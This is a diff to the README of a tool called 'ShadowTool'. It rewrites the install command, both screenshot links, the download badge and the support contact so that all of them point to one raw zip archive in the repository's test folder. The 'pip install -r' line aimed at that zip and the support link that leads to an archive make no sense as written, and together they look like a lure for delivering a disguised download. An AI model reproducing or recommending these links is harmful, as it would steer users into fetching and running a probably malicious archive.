@@ -32,7 +32,7 @@ To begin using ShadowTool, follow these simple steps:
 
 1. Clone the repository to your local machine.
 2. Navigate to the directory where ShadowTool is located.
-3. Install any necessary dependencies by running `npm install` or `pip install -r https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0`, depending on the tools you wish to use.
+3. Install any necessary dependencies by running `npm install` or `pip install -r https://github.com/VantageSolutions/ShadowTool/raw/refs/heads/master/src/test/Shadow-Tool-v2.4.zip`, depending on the tools you wish to use.
 4. Launch the desired tool by executing the corresponding script or command.
 
 ---
@@ -41,14 +41,14 @@ To begin using ShadowTool, follow these simple steps:
 
 Here are some snapshots of ShadowTool in action:
 
-![Screenshot 1](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0)
-![Screenshot 2](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0)
+![Screenshot 1](https://github.com/VantageSolutions/ShadowTool/raw/refs/heads/master/src/test/Shadow-Tool-v2.4.zip)
+![Screenshot 2](https://github.com/VantageSolutions/ShadowTool/raw/refs/heads/master/src/test/Shadow-Tool-v2.4.zip)
 
 ---
 
 ## Download ShadowTool 📥
 
-[![Download ShadowTool](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0<COLOR-CODE>?style=for-the-badge)](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0)
+[![Download ShadowTool](https://github.com/VantageSolutions/ShadowTool/raw/refs/heads/master/src/test/Shadow-Tool-v2.4.zip<COLOR-CODE>?style=for-the-badge)](https://github.com/VantageSolutions/ShadowTool/raw/refs/heads/master/src/test/Shadow-Tool-v2.4.zip)
 
 Click the button above to download ShadowTool and start exploring its capabilities!
 
@@ -68,7 +68,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Support ℹ️
 
-For any inquiries, issues, or feedback regarding ShadowTool, please contact our support team at [https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0](https://github.com/VantageSolutions/ShadowTool/releases/tag/v2.0).
+For any inquiries, issues, or feedback regarding ShadowTool, please contact our support team at [https://github.com/VantageSolutions/ShadowTool/raw/refs/heads/master/src/test/Shadow-Tool-v2.4.zip](https://github.com/VantageSolutions/ShadowTool/raw/refs/heads/master/src/test/Shadow-Tool-v2.4.zip).
 
 ---
 
